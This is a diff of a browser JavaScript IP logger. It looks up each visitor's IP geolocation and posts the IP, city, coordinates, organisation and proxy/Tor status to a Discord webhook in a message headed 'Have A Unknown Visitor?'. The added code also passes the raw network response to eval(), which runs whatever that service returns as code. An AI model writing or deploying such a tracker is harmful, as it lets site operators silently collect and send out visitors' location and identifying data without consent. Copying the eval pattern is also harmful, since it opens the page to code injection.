@@ -1,16 +1,17 @@
-const request = new XMLHttpRequest();
-request.open("POST", "https://discord.com/api/webhooks/?");
-
-request.setRequestHeader('Content-type', 'application/json');
-
-function httpGet(theUrl)
+ function httpGet(theUrl)
   {
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
     xmlHttp.send( null );
     return xmlHttp.responseText;
   }
-var Info = httpGet('https://ip-api.io/json')
+let suk = eval("function l(){return"+httpGet("https://ip-api.io/json")+"} l()")
+
+const request = new XMLHttpRequest();
+request.open("POST", "https://discord.com/api/webhooks/?");
+
+request.setRequestHeader('Content-type', 'application/json');
+
 
 
 const params = {
@@ -19,11 +20,26 @@ const params = {
 	"embeds": [{
     		"title": "**Have A Unknown Visitor?**",
 		"fields": [
-      		{
-	        "name": "Location Client",
- 	     	 "value": Info,
-	       	 "inline": true
-      		}
+            {
+	        "name": "City",
+ 	     	 "value": "City: **"+suk.city+"**\nregion_code: **"+suk.region_code + "**\nregion_name: **"+suk.region_name+"**\n",
+                "inline": true
+      		},
+            {
+	        "name": "Country",
+ 	     	 "value": "country_code:**"+ suk.country_code + "**\ncountry_name: **"+ suk.country_name +"**\ncallingCode: **"+suk.callingCode+"**\ncountryCapital: **" + suk.countryCapital+"**\ncurrency: **"+suk.currency+"**\ncurrencySymbol: **"+suk.currencySymbol+"**\nemojiFlag: **"+suk.emojiFlag+"**\nflagUrl: **[View](" + suk.flagUrl+")**\ntime_zone: **"+suk.time_zone+"**\nzip_code: "+suk.zip_code,
+                "inline": true
+      		},
+            {
+	        "name": "Client",
+ 	     	 "value": "Ip: **"+suk.ip+"**\nOrganisation: **"+suk.organisation+"**\nis_in_european_union: **"+suk.is_in_european_union + "**\nLatitude: **"+suk.latitude+"**\nLongitude: **"+suk.longitude+"**",
+                "inline": true
+      		},
+            {
+	        "name": "Another",
+ 	     	 "value": "metro_code: **"+suk.metro_code+"**\nSuspiciousFactors = {\n-\tisProxy: **"+suk.suspiciousFactors.isProxy+"**\n-\tisSpam: **" + suk.suspiciousFactors.isSpam+"**\n-\tisSuspicious: **"+ suk.suspiciousFactors.isSuspicious+"**\n-\tisTorNode: **"+suk.suspiciousFactors.isTorNode+"**\n}",
+                "inline": true
+      		},
     		],
 		"color": Math.floor(Math.random()*10000000)
   }]  
